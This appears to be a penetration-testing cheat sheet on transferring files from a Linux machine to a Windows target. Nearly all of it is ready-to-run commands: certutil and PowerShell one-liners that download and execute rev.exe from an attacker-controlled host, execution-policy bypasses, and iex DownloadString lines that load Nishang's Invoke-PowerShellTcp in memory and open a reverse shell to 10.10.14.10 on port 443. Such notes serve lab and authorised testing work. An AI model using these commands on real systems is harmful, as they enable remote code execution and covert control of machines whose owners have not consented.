---
title: "File Transfer (Linux to Windows)"
date: 2024-6-26
tags: ["file transfer", "Windows", "evil-winrm"]
---

---
### HTTP

#### Start a Local HTTP Server

```bash
python3 -m http.server 80
```

#### cmd

```bash
certutil -urlcache -split -f http://10.10.14.10/rev.exe C:\ProgramData\rev.exe
```

```bash
# Upload and Run
certutil -urlcache -split -f http://10.10.14.10/rev.exe C:\ProgramData\rev.exe && C:\ProgramData\rev.exe
```

#### powershell

```powershell
# Long version
Invoke-WebRequest http://10.10.14.10/rev.exe -OutFile C:\ProgramData\rev.exe
```

```powershell
# Short version
iwr http://10.10.14.10/rev.exe -o C:\ProgramData\rev.exe
```

<small>*Note: PowerShell 3.0+*</small>

```powershell
# Long version
powershell.exe -ExecutionPolicy bypass curl 10.10.14.10/rev.exe -o C:\ProgramData\rev.exe
```

```powershell
# Short version
powershell -ep bypass curl 10.10.14.10/rev.exe -o C:\ProgramData\rev.exe
```

<small>*Note: curl is not always available*</small>

```powershell
# Load into memory and Run
```

```powershell
# Long version
Invoke-Expression (New-Object Net.WebClient).DownloadString('http://10.10.14.10/rev.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.10 -Port 443
```

```powershell
# Short version
iex (New-Object Net.WebClient).DownloadString('http://10.10.14.10/rev.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.10 -Port 443
```

```powershell
# Combined version
iex (iwr http://10.10.14.10/rev.ps1)
```

<small>*Note: [rev.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)*</small>

---

### Evil-winrm

```bash
# Evil-winrm built-in function
upload "/tmp/example.txt" "C:\ProgramData\example.txt"
```

<br>